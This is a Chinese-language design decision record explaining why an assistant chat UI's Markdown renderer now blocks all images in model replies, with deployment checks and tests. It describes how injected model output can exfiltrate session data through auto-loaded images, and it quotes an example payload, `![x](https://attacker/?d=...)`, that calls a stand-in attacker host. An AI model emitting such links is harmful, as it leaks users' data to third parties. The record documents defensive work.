# 助手 Markdown 图片阻断（#1229，R13-R03）

Status: implemented
Class: bug-fix

## Decision

`MessageBubble`（全站唯一 `ReactMarkdown` 渲染点）此前已禁 rehype-raw（防 HTML
注入，ADR-0031 D7）、链接加固（`target=_blank` + `noopener noreferrer`），但未限制
图片：模型回复不可信，`![x](https://attacker/?d=...)` 会被浏览器自动请求，携带
会话上下文外发（IP/Referer + URL 内编码数据），构成注入后的外发信道。

修正（前端阻断，与部署形态无关）：

- 自定义 `img` 组件：**一律不渲染 `<img>`**（不发请求），改为纯文本占位
  「图片已禁用[: alt]」+ URL 文本（可复制判断）；**相对路径同样阻断**（防内部
  端点被模型可控的 GET 触发）。
- 组件文档注释同步渲染基座约束。

部署侧核验（验收 3「部署侧验证记录」）：

- 仓库内无 CSP：`deploy/` 与 backend 中间件均无 `Content-Security-Policy`；
- 本机部署 `/etc/nginx/sites-enabled/stability-platform` 亦无 CSP 头
  （`grep Content-Security-Policy` exit=1；仅有 Cache-Control add_header）；
- 结论：**当前无部署级兜底，前端阻断是唯一防线**；若未来 nginx 引入
  `img-src` CSP，可作第二层。

## Alternatives

- 仅靠 CSP：仓库与部署均无 CSP，且 internal 无 TLS 部署形态多，短期不可依赖；
  前端阻断与部署形态无关。
- 白名单相对路径/平台域图片：相对 GET 仍可触发内部端点请求（模型可控 URL），
  收益低；如未来确有合法图片需求，再按「平台产物路径白名单 + 代理」评估。
- 用 `urlTransform` 改写 URL：等价于组件层阻断但表达力差（无法展示 alt/URL 供
  人工判断）。

## Verification

- `npx vitest run src/pages/assistant/components/MessageBubble.test.tsx` → 2/2
  （外链阻断 + alt/URL 文本呈现 + 文本展示不受损；相对路径同样阻断）
- 红绿：未修复实现上 2 条用例失败（`<img>` 被渲染）
- 全量前端套件 / type-check / eslint / build / `check:quick` 通过
- 部署侧验证记录：见上（本机 nginx 无 CSP；仓库无 CSP）

## Revisit

- 若产品需要助手渲染平台内图片（如产物缩略图），评估「同源产物路径白名单 +
  后端代理」而不是放开 `<img>`；
- nginx 引入 CSP 后，`img-src` 与本阻断并存（纵深防御）。
